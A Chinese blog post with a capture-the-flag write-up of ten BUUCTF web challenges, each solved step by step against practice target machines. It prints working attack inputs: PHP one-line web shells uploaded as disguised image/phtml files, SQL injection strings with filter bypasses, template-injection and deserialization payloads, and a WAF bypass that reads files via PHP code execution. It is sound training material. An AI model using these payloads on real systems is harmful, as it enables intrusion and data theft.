<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>BUUCTF——Web1 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="BUUCTF——Web1" />
<meta property="og:description" content="一、[极客大挑战 2019]Http 打开靶机，出现以下页面
查看源代码
发现Secret.php，访问后出现以下页面
接着我们使用bp进行抓包
在请求头中添加
Referer:https://Sycsecret.buuoj.cn
字段发送请求，出现以下页面 根据提示更改User-Agent为
User-Agent: Syclover
发送请求，出现以下页面 提示要是来自本地的访问请求，联想到127.0.0.1，需要
X-Forwarded-For: 127.0.0.1 X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。
出现flag
flag为
flag{8121414c-8ed4-490e-9d34-351f08b4504b}
二、[极客大挑战 2019]Knife 打开靶机，出现以下页面
使用菜刀进行连接
连接成功后，在/flag目录下获得flag
flag为
flag{b8b99cdb-fdac-4ce1-bec1-d647e1ee47bb}
同理可得，也可用蚁剑进行此操作 三、[极客大挑战 2019]Upload 打开靶机，出现以下页面
首先我们尝试上传木马文件
&lt;?php @eval($_POST[&#39;yy&#39;]); ?&gt; 我们先将一句话木马写在记事本后，将后缀名改为.jpg 提交后出现以下页面，不能含有&lt;?，看来是被过滤了
我们尝试换个一句话木马上传
GIF89a
&lt;script language=&#34;php&#34;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt; 再次上传后出现以下页面，说明上传成功
接着我们进行抓包
经过多次尝试我们发现，文件的后缀不能为php，文件绕过的格式也有很多格式php,php3,php4,php5,phtml，但是经过尝试后发现只有.phtml此后缀名可绕过，其余均无法绕过，所以我们将上传文件yy.jpg的后缀改为phtml
查看/upload
找到我们上传的文件yy.phtml
查看/upload/yy.phtml
使用蚁剑进行连接，连接成功后
在/flag目录下找到flag
flag为
flag{27541e51-6965-4231-89b8-e9071b3b8b46} 四、[护网杯 2018]easy_tornado 打开靶机，出现以下页面
挨着点击三个文件查看
/flag.txt
/welcome.txt render（）是tornado里的函数，可以生成html模板。是一个渲染函数 ，就是一个公式，能输出前端页面的公式。 tornado是用Python编写的Web服务器兼Web应用框架
/hints.txt
/file?filename=/fllllllllllllag&amp;filehash={{1}}
模板注入必须通过传输型如{{xxx}}的执行命令
通过msg拿到cookie_secret的值
/error?msg={{handler.settings}}
提示信息，得到cookie_secret:750eeb79-5711-4775-8086-ed342d0f6b67
然后结合md5(cookie_secret&#43;md5(filename))
即md5(&#39;750eeb79-5711-4775-8086-ed342d0f6b67&#39;&#43;md5(&#39;/fllllllllllllag&#39;))
filename=/fllllllllllllag的md5：3bf9f6cf685a6dd8defadabfb41a03a1" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/5583735aa5597916b22f3385cdc73057/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-17T19:19:47+08:00" />
<meta property="article:modified_time" content="2023-07-17T19:19:47+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">BUUCTF——Web1</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 id="1%E3%80%81%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp">一、[极客大挑战 2019]Http</h2> 
<p>打开靶机，出现以下页面</p> 
<p><img alt="" height="539" src="https://images2.imgbox.com/16/1d/CVgJjJCM_o.png" width="893"></p> 
<p>查看源代码</p> 
<p><img alt="" height="890" src="https://images2.imgbox.com/d3/22/ueQUDKWN_o.png" width="1200"> 发现Secret.php，访问后出现以下页面</p> 
<p><img alt="" height="507" src="https://images2.imgbox.com/87/ea/JuT8Xrpz_o.png" width="1200"></p> 
<p> 接着我们使用bp进行抓包</p> 
<p><img alt="" height="818" src="https://images2.imgbox.com/33/e4/j6tHVCgG_o.png" width="1200"></p> 
<p> 在请求头中添加</p> 
<blockquote> 
 <p>Referer:https://Sycsecret.buuoj.cn</p> 
</blockquote> 
<p>字段发送请求，出现以下页面 </p> 
<p><img alt="" height="822" src="https://images2.imgbox.com/3e/99/1gvRyi8Z_o.png" width="1200"></p> 
<p>根据提示更改User-Agent为</p> 
<blockquote> 
 <p>User-Agent: Syclover</p> 
</blockquote> 
<p>发送请求，出现以下页面 </p> 
<p><img alt="" height="800" src="https://images2.imgbox.com/d0/25/itwsEbuw_o.png" width="1200"></p> 
<p>提示要是来自本地的访问请求，联想到127.0.0.1，需要</p> 
<blockquote> 
 <p>X-Forwarded-For: 127.0.0.1 </p> 
</blockquote> 
<p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p> 
<p>出现flag</p> 
<p><img alt="" height="800" src="https://images2.imgbox.com/3d/18/hQ6HXFlr_o.png" width="1200"></p> 
<p> flag为</p> 
<blockquote> 
 <p>flag{8121414c-8ed4-490e-9d34-351f08b4504b}</p> 
</blockquote> 
<h2> 二、[极客大挑战 2019]Knife</h2> 
<p>打开靶机，出现以下页面</p> 
<p><img alt="" height="429" src="https://images2.imgbox.com/00/ad/UFuPqPEt_o.png" width="1100"></p> 
<p> 使用菜刀进行连接</p> 
<p></p> 
<p><img alt="" height="375" src="https://images2.imgbox.com/14/90/7WrFP70E_o.png" width="625"></p> 
<p>连接成功后，在/flag目录下获得flag</p> 
<p><img alt="" height="725" src="https://images2.imgbox.com/3c/8c/XRYayjB1_o.png" width="1200"></p> 
<p> flag为</p> 
<blockquote> 
 <p>flag{b8b99cdb-fdac-4ce1-bec1-d647e1ee47bb}</p> 
</blockquote> 
<p>同理可得，也可用蚁剑进行此操作 </p> 
<h2>三、[极客大挑战 2019]Upload</h2> 
<p>打开靶机，出现以下页面</p> 
<p><img alt="" height="586" src="https://images2.imgbox.com/93/1f/btvPwGtQ_o.png" width="1200"></p> 
<p> 首先我们尝试上传木马文件</p> 
<blockquote> 
 <p>&lt;?php @eval($_POST['yy']); ?&gt; </p> 
</blockquote> 
<p>我们先将一句话木马写在记事本后，将后缀名改为.jpg </p> 
<p><img alt="" height="649" src="https://images2.imgbox.com/25/aa/iA2cAJfU_o.png" width="1135"></p> 
<p> 提交后出现以下页面，不能含有&lt;?，看来是被过滤了</p> 
<p><img alt="" height="275" src="https://images2.imgbox.com/ab/e9/kBotrTrl_o.png" width="1200"></p> 
<p>我们尝试换个一句话木马上传</p> 
<blockquote> 
 <p>GIF89a<br> &lt;script language="php"&gt;eval($_POST['shell']);&lt;/script&gt; </p> 
</blockquote> 
<p></p> 
<p><img alt="" height="716" src="https://images2.imgbox.com/ec/3a/l3VFyFcK_o.png" width="968"></p> 
<p>再次上传后出现以下页面，说明上传成功</p> 
<p><img alt="" height="469" src="https://images2.imgbox.com/50/7e/XCU0HCYR_o.png" width="1075"></p> 
<p> 接着我们进行抓包<img alt="" height="803" src="https://images2.imgbox.com/d9/b0/MMM01EHV_o.png" width="1200"></p> 
<p> 经过多次尝试我们发现，文件的后缀不能为php，文件绕过的格式也有很多格式php,php3,php4,php5,phtml，但是经过尝试后发现只有.phtml此后缀名可绕过，其余均无法绕过，所以我们将上传文件yy.jpg的后缀改为phtml</p> 
<p><img alt="" height="807" src="https://images2.imgbox.com/50/c7/Zhautq9S_o.png" width="1200"></p> 
<p> 查看/upload</p> 
<p>找到我们上传的文件yy.phtml</p> 
<p><img alt="" height="995" src="https://images2.imgbox.com/39/1b/2IAFhsCL_o.png" width="988"></p> 
<p>查看/upload/yy.phtml</p> 
<p> <img alt="" height="238" src="https://images2.imgbox.com/79/75/PHrwQgIV_o.png" width="934"></p> 
<p>使用蚁剑进行连接，连接成功后</p> 
<p><img alt="" height="494" src="https://images2.imgbox.com/65/37/hd2zFApg_o.png" width="929"></p> 
<p>在/flag目录下找到flag</p> 
<p><img alt="" height="866" src="https://images2.imgbox.com/49/26/ntczbCCX_o.png" width="1200"></p> 
<p>flag为</p> 
<blockquote> 
 <p>flag{27541e51-6965-4231-89b8-e9071b3b8b46} </p> 
</blockquote> 
<h2> 四、[护网杯 2018]easy_tornado</h2> 
<p>打开靶机，出现以下页面</p> 
<p><img alt="" height="262" src="https://images2.imgbox.com/19/ee/uNhsBd1S_o.png" width="788"></p> 
<p>挨着点击三个文件查看</p> 
<p>/flag.txt</p> 
<p><img alt="" height="268" src="https://images2.imgbox.com/e1/fa/LcLF3lDT_o.png" width="685">/welcome.txt </p> 
<blockquote> 
 <p>render（）是tornado里的函数，可以生成html模板。是一个渲染函数 ，就是一个公式，能输出前端页面的公式。 tornado是用Python编写的Web服务器兼Web应用框架</p> 
</blockquote> 
<p><img alt="" height="167" src="https://images2.imgbox.com/8c/9b/zyIPn86Z_o.png" width="873"></p> 
<p>  /hints.txt</p> 
<p><img alt="" height="188" src="https://images2.imgbox.com/ca/72/tj9mH6Bi_o.png" width="688"></p> 
<blockquote> 
 <p> /file?filename=/fllllllllllllag&amp;filehash={<!-- -->{1}}</p> 
 <p>模板注入必须通过传输型如{<!-- -->{xxx}}的执行命令</p> 
</blockquote> 
<p><img alt="" height="269" src="https://images2.imgbox.com/77/37/W4Nz5U10_o.png" width="917"> 通过msg拿到cookie_secret的值</p> 
<blockquote> 
 <p>/error?msg={<!-- -->{handler.settings}}</p> 
</blockquote> 
<p> <img alt="" height="349" src="https://images2.imgbox.com/de/71/UJ6HjLr6_o.png" width="1200"></p> 
<p>提示信息，得到cookie_secret:750eeb79-5711-4775-8086-ed342d0f6b67</p> 
<p>然后结合md5(cookie_secret+md5(filename))</p> 
<p>即md5('750eeb79-5711-4775-8086-ed342d0f6b67'+md5('/fllllllllllllag'))</p> 
<p>filename=/fllllllllllllag的md5：3bf9f6cf685a6dd8defadabfb41a03a1</p> 
<p><img alt="" height="352" src="https://images2.imgbox.com/f3/50/rNWZkDqN_o.png" width="1200"></p> 
<blockquote> 
 <p>/file?filename=/fllllllllllllag&amp;filehash=5c912c00167c1f6003856e86486e3622</p> 
</blockquote> 
<p> 出现flag</p> 
<p><img alt="" height="332" src="https://images2.imgbox.com/d6/28/S0FdLYTL_o.png" width="1200"></p> 
<p> flag为：</p> 
<blockquote> 
 <p>flag{98c1fb2f-e79a-45d5-8d86-dfef15dbc063}</p> 
</blockquote> 
<h2>五、[极客大挑战 2019]BabySQL</h2> 
<p> 打开靶机，出现以下页面</p> 
<p><img alt="" height="809" src="https://images2.imgbox.com/b7/14/4hSvEPzy_o.png" width="1200"></p> 
<p>我们看到这类题首先想到使用万能密码，出现以下页面 </p> 
<blockquote> 
 <p>/check.php?username=admin' or '1'='1&amp;password=1</p> 
</blockquote> 
<p><img alt="" height="346" src="https://images2.imgbox.com/9e/67/ERtfmlxa_o.png" width="1200"></p> 
<p> or关键字被过滤，尝试使用双写进行绕过</p> 
<blockquote> 
 <p>/check.php?username=admin' %23&amp;password=1</p> 
</blockquote> 
<p><img alt="" height="730" src="https://images2.imgbox.com/f7/4d/whYqLtG6_o.png" width="1200"></p> 
<p> 接着进行常规的sql注入，这里先进行爆库 </p> 
<blockquote> 
 <p> /check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,database() %23</p> 
</blockquote> 
<p><img alt="" height="451" src="https://images2.imgbox.com/2d/ab/oxBcLUmi_o.png" width="997"></p> 
<p>查找库</p> 
<blockquote> 
 <p>/check.php?username=admin&amp;password=admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23</p> 
</blockquote> 
<p><img alt="" height="475" src="https://images2.imgbox.com/5f/a6/Yq7D4emG_o.png" width="1200"></p> 
<p> 看到ctf后，我们猜想flag在里面，因此我们尝试将其进行爆破</p> 
<p><img alt="" height="437" src="https://images2.imgbox.com/f3/1e/H6IJBWg6_o.png" width="1200"></p> 
<p>出现flag字样，为查找里面相应的数据，我们将其进行爆破</p> 
<blockquote> 
 <p>/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) %23 </p> 
</blockquote> 
<p> 出现flag<img alt="" height="408" src="https://images2.imgbox.com/3b/ee/ZmrQIplm_o.png" width="1200"></p> 
<p> flag为：</p> 
<blockquote> 
 <p>flag{16a4f98d-23f1-4ad1-ae30-d4de7babfac9}</p> 
</blockquote> 
<h2> 六、[极客大挑战 2019]PHP</h2> 
<p>打开靶机，出现以下页面</p> 
<p><img alt="" height="557" src="https://images2.imgbox.com/e4/c5/BNyfqUg4_o.png" width="1001"></p> 
<p>提示备份网站，直接扫描目录，得到www.zip<br> 解压得到class.php,index.php,flag.php等源码 </p> 
<p><img alt="" height="281" src="https://images2.imgbox.com/b5/94/1r5wBrlj_o.png" width="802"></p> 
<p>首先我们将flag.php打开查看一下，没有flag，我们将其他几个文件也进行查看</p> 
<p><img alt="" height="229" src="https://images2.imgbox.com/e8/da/Dis0NDKb_o.png" width="853"></p> 
<p> 在index.php文件中发现代码第39行unserialize可能存在反序列化漏洞</p> 
<blockquote> 
 <p> 序列化：函数为serialize()，把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等<br> 反序列化：函数为unserialize()，将字符串转换成变量或对象的过程<br> 常用的内置方法：<br> __construct()：创建对象时初始化，当一个对象创建时被调用<br> __wakeup() 使用unserialize时触发<br> __sleep() 使用serialize时触发<br> __destruction()：结束时销毁对象，当一个对象销毁时被调用</p> 
</blockquote> 
<p><img alt="" height="673" src="https://images2.imgbox.com/ca/53/SdUjSABe_o.png" width="1200"></p> 
<p> 在class.php文件中发现代码中含有__destruct，__construct，__wakeup可以判断存在反序列化漏洞<img alt="" height="938" src="https://images2.imgbox.com/d3/44/vSECBLnZ_o.png" width="1073"></p> 
<p> 执行__destruct()时会输出flag，那么我们需要一个Name对象，所以我们传递一个Name对象序列化后的值<br> 根据__destruct()可以得知，属性password==100，username===admin时可以得到flag</p> 
<pre><code class="language-php">&lt;?php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    }
}
$a = new Name('admin',100);
echo(serialize($a));
?&gt;
</code></pre> 
<p> 通过运行得到序列化后的字符串</p> 
<blockquote> 
 <p>O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;} </p> 
</blockquote> 
<p><img alt="" height="650" src="https://images2.imgbox.com/f2/cf/9ccwRiRw_o.png" width="1200"></p> 
<p>__wakeup()会将username重新赋值为“guest”,所以我们需要想办法将__wakeup()函数绕过。在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</p> 
<blockquote> 
 <p>原本：O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}<br> 绕过：O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}</p> 
</blockquote> 
<p>在序列化字符串中，私有属性前其实是有两个’\0’的，分别在类名前和属性名前，比如在vscode里执行这段序列化代码就会出现显示不全的情况，所以我们在传参时要加上’%00’</p> 
<blockquote> 
 <p>?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}</p> 
</blockquote> 
<p> 出现flag<img alt="" height="725" src="https://images2.imgbox.com/d8/6a/laU5AAO6_o.png" width="1200"></p> 
<p> flag为：</p> 
<blockquote> 
 <p>flag{4c1b5bd0-9506-451e-9792-5a43a4273914}</p> 
</blockquote> 
<h2> 七、[ACTF2020 新生赛]BackupFile</h2> 
<p>打开靶机，出现以下页面 </p> 
<p><img alt="" height="269" src="https://images2.imgbox.com/0b/2d/P3FQJkck_o.png" width="783"></p> 
<p> 查看源码后，发现并没有什么，但是我们根据题目Backup file，翻译成中文就是备份文件的意思</p> 
<p>通个扫描发现备份文件/index.php.bak，下载该备份文件信息后，打开发现是源码</p> 
<p><img alt="" height="600" src="https://images2.imgbox.com/89/f3/kCbFNe37_o.png" width="1095"></p> 
<blockquote> 
 <p> include_once "flag.php";：包含flag文件<br> $key = $_GET['key'];：需要一个参数key<br> if(!is_numeric($key))：对key做过滤，<br> is_numeric：如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。<br> if($key == $str)：将key和str做个了比较，这里是弱类型比较。<br> 如果key为数字时，在做==比较时，str字符串自动变为数字，即str=123</p> 
</blockquote> 
<p>要求GET方式传递一个Key值，并且Key必须为数字且等于123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3这一字符串</p> 
<p>感觉是考PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉</p> 
<p>根据上述条件，构造出payload：</p> 
<blockquote> 
 <p>/index.php?key=123</p> 
</blockquote> 
<p> 出现flag</p> 
<p><img alt="" height="210" src="https://images2.imgbox.com/70/9f/AWTYSBRU_o.png" width="976"></p> 
<p>flag为：</p> 
<blockquote> 
 <p>flag{4045b91f-9e38-4715-ad81-912ee1656071} </p> 
</blockquote> 
<h2>八、[RoarCTF 2019]Easy Calc </h2> 
<p>打开靶机，出现以下页面</p> 
<p><img alt="" height="277" src="https://images2.imgbox.com/85/7f/6IoONNJY_o.png" width="1200"></p> 
<p> 我们打开源代码</p> 
<p><img alt="" height="772" src="https://images2.imgbox.com/b0/9c/rsYelRHZ_o.png" width="1141"></p> 
<p>尝试访问这个calc.php，发现多行匹配过滤了一部分特殊符号，但是实际访问时，发现字母全部被拦截了，看来是上了层WAF</p> 
<p><img alt="" height="393" src="https://images2.imgbox.com/63/05/5XaKiWa6_o.png" width="878"></p> 
<p>绕过waf对num的检测，（num前面需要加上空格）</p> 
<p>利用PHP的字符串解析特性</p> 
<blockquote> 
 <p>/calc.php? num=phpinfo() </p> 
</blockquote> 
<p><img alt="" height="666" src="https://images2.imgbox.com/9f/f5/kPNa0gka_o.png" width="1200"></p> 
<p>成功绕过waf，对于waf的绕过，由于php在执行的时候会自动忽略掉空格字符，包含换行回车等，而waf不可以，所以可以构造一个payload为 </p> 
<p>利用scandir()列出目录和文件，var_dump()用于输出</p> 
<blockquote> 
 <p>/calc.php? num=var_dump(scandir(chr(47)))</p> 
</blockquote> 
<p>var_dump() 函数用于输出变量的相关信息。 var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p> 
<p>var_dump()相当于echo</p> 
<p>scandir()扫描目录下的文件，scandir(/)相当于ls /</p> 
<p>chr(47) 是  /  的ASCII编码</p> 
<p><img alt="" height="190" src="https://images2.imgbox.com/f8/f8/EWuDqB48_o.png" width="1200"></p> 
<p>尝试访问flag文件，出现flag</p> 
<p>一、利用file_get_contents()读取并输出文件内容</p> 
<blockquote> 
 <p>/calc.php/=chr(47)，f=chr(102),l=chr(49),a=chr(97),g=chr(103),g=chr(103) ? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); </p> 
</blockquote> 
<p><img alt="" height="197" src="https://images2.imgbox.com/27/6d/BomiRDVA_o.png" width="1200">二、 </p> 
<blockquote> 
 <p>/calc.php? num=var_dump(include(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) </p> 
</blockquote> 
<p><img alt="" height="234" src="https://images2.imgbox.com/05/c2/t5I2RHf1_o.png" width="1200"></p> 
<p>flag为：</p> 
<blockquote> 
 <p>flag{fb285683-4047-44a0-a696-b46023eb42d2} </p> 
</blockquote> 
<h2>九、[极客大挑战 2019]BuyFlag </h2> 
<p>打开靶机，出现以下页面</p> 
<p><img alt="" height="662" src="https://images2.imgbox.com/2f/16/xCKx80GX_o.png" width="1194"></p> 
<p>查看源代码，出现两个php（index.php，pay.php）</p> 
<p><img alt="" height="711" src="https://images2.imgbox.com/c7/e2/lGbmd8Eh_o.png" width="1038"></p> 
<p> index.php<img alt="" height="994" src="https://images2.imgbox.com/70/79/nko3Ate1_o.png" width="1200"></p> 
<p>  pay.php</p> 
<p><img alt="" height="988" src="https://images2.imgbox.com/5e/59/stKlCUdA_o.png" width="1200"></p> 
<p> 查看源代码</p> 
<p>提示money=100000000，password == 404</p> 
<p>is_numeric来判断password是否为数字或数字字符串，导致我们给password传入的参数只能为字符串类型的</p> 
<blockquote> 
 <p>is_numeric()函数检测字符串是否只由数字组成，如果字符串中只包括数字，就返回Ture，否则返回False</p> 
 <p>$password == 404，在PHP中==是一种弱类型比较，即只取字符串中开头的整数部分进行比较。</p> 
</blockquote> 
<p>必须提交money和password 两个参数</p> 
<p>password不可以为纯数字，但是它要与404相等</p> 
<p>isset()函数是用来检验变量是否被设置的</p> 
<p><img alt="" height="258" src="https://images2.imgbox.com/43/2f/wT4CLYbX_o.png" width="724"></p> 
<p> 使用bp抓包</p> 
<p><img alt="" height="847" src="https://images2.imgbox.com/2b/15/cYQOlRLH_o.png" width="1200"></p> 
<p> 变更请求方法<img alt="" height="776" src="https://images2.imgbox.com/0c/de/gIQ5y3Jj_o.png" width="1200"></p> 
<p>将Cookie：user=0改为1，表示是学生</p> 
<p>然后添加money和password的值<br> password=404 &amp;money=100000000</p> 
<p>password=404a或password = 404%20(相当于在404后面加了一个空格，其他空白字符也可以绕过)就可以了，既绕过了is_numeric()又完成了password的匹配</p> 
<p><img alt="" height="816" src="https://images2.imgbox.com/d5/c2/nvKFrQpc_o.png" width="1200"> 回显数字太长，就换一个表示方式</p> 
<blockquote> 
 <p>1、科学计数法绕过money=1e9</p> 
 <p>2、数组绕过money[]=1</p> 
</blockquote> 
<p>出现flag</p> 
<p><img alt="" height="785" src="https://images2.imgbox.com/9d/e1/bFzwfBRn_o.png" width="1200"></p> 
<p>flag为：</p> 
<hr> 
<blockquote> 
 <p>flag{c8729030-540e-4306-878b-d5ced3d0ce6c} </p> 
</blockquote> 
<h2> 十、[BJDCTF2020]Easy MD5</h2> 
<p>打开靶机，出现以下页面</p> 
<p><img alt="" height="426" src="https://images2.imgbox.com/13/fe/iw9jLKKE_o.png" width="887"></p> 
<p>使用bp进行抓包，出现提示</p> 
<blockquote> 
 <p>Hint: select * from 'admin' where password=md5($pass,true)</p> 
 <p>md5（string，raw）</p> 
 <p>string：必需，要计算的字符串</p> 
 <p>raw：可选</p> 
 <p>         默认不写为FALSE。32位16进制的字符串</p> 
 <p>         TRUE。16位原始二进制格式的字符串</p> 
</blockquote> 
<p> Hint是md5类型的sql注入</p> 
<p>password经过md5加密，有true参数以字符串形式显示出来</p> 
<p><img alt="" height="792" src="https://images2.imgbox.com/db/75/HQehbLof_o.png" width="1200"></p> 
<p>首先我们要找到一个字符串，这个字符串经过md5得到的16位原始二进制的字符串能帮我们实现sql注入</p> 
<p>取32位16进制的md5值里带有276f7227这个字段的</p> 
<p>ffifdyop经过md5加密后为276f722736c95d99e921722cf9ed621c</p> 
<blockquote> 
 <p>ffifdyop经过md5加密后，使用hex解码可以转换为'or'</p> 
 <p>MySQL默认将十六进制数转换为hex()</p> 
 <p>..md5的强连接和弱连接使用数组绕过</p> 
</blockquote> 
<p><img alt="" height="440" src="https://images2.imgbox.com/b8/26/mBS3Rg7x_o.png" width="1200"></p> 
<p> 输入框内输入ffifdyop<img alt="" height="388" src="https://images2.imgbox.com/de/a8/WofqsXvk_o.png" width="1057"></p> 
<p> 出现以下页面</p> 
<p><img alt="" height="505" src="https://images2.imgbox.com/7f/ce/nB5uqBAq_o.png" width="1200"></p> 
<p>进行抓包或者是查看源代码，出现以下内容</p> 
<pre><code>&lt;!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b &amp;&amp; md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
--&gt;</code></pre> 
<p><img alt="" height="735" src="https://images2.imgbox.com/17/74/rVcoXmjK_o.png" width="1200"></p> 
<p>根据返回的信息的提示，需要绕过的是md5的弱等于，它的要求是变量1和变量2要求不相等，然而，通过md5加密后的结果要进行相等<br> 使用数组进行绕过</p> 
<blockquote> 
 <p> /levels91.php?a[]=1&amp;b[]=2 </p> 
</blockquote> 
<pre><code>&lt;?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}</code></pre> 
<p><img alt="" height="323" src="https://images2.imgbox.com/9d/ab/xGentc6u_o.png" width="889"> 使用数组绕过</p> 
<blockquote> 
 <p>param1[]=1&amp;param2[]=2</p> 
</blockquote> 
<p> 变更请求方法，出现flag </p> 
<p><img alt="" height="754" src="https://images2.imgbox.com/e5/6c/cVvl9oqi_o.png" width="1200"></p> 
<blockquote> 
 <p>双等号（==）：两个等号称为等值符，当等号两边的值为相同数据类型时，直接比较值是否相同，当类型不同时会发生数据类型的转换，转换为相同的类型后再进行比较。（通常在if判断语句中使用） </p> 
 <p> （1）如果等号两边是boolean、string、number三者中任意两者进行比较时，优先转换为数字进行比较。</p> 
 <p>（ 2）如果等号两边出现了null或undefined，null和undefined除了和自己相等，就彼此相等</p> 
 <p></p> 
 <p>三等号（===）：三个等号称为绝对等同符，既要判断数值也要判断数据类型是否相等，当等号两边的值为相同数据类型时，直接比较等号两边的值，值相同则返回true；若等号两边的值类型不同时直接返回false。</p> 
</blockquote> 
<p>flag为：</p> 
<blockquote> 
 <p>flag{80ec0969-e689-4639-b761-becb307188af} </p> 
</blockquote> 
<p></p> 
<p></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/d80ac2f7840592905bbf373a672901d9/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">VMware 17密钥</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/ec6973741874a731a96f763f36eee96f/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">BUUCTF——Web</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>